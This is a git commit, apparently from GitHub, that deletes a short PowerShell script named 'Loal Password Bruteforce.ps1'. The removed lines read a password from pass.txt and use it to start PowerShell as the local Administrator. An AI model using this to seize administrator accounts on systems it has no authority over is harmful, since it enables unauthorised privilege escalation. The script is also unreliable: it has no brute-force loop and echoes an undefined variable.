2cfc47c38d3c6d3725ae589884c9ee3a5df5133a
SPY3r <69580643+SPY3r@users.noreply.github.com>
2022-08-31 11:57:54 +0530

    Delete Loal Password Bruteforce.ps1

--- Loal Password Bruteforce.ps1
+++
@@ -1,6 +0,0 @@
-$pass = Get-Content pass.txt
-cls
-$password = ConvertTo-SecureString $pass -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential (".\Administrator", $password)
-echo $pa
-Start-Process powershell -Credential $Cred
